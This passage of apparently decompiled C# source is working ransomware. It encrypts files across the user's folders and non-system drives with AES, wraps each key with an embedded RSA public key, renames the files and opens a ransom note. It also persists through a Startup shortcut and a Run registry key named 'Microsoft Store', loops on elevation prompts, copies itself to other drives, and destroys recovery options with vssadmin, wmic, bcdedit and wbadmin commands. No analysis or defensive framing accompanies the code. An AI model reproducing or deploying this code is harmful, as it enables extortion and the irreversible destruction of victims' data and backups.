			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>tGetD5bdXzAsTcZskj94BJxp2lUWoVgRxeH8BANDNwbPbTlCBnWnKN3xOWSTM4NfEzcofAbubMH2MlUvGlze3OYjvvZJfRQRdYuiSlyGklnZrrVmSIhCBt4EtCJc3ayUpEvQzBO2PKbsUeyzWTcWtNDCGXvqBbQjHXhZCvZ+X1k=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
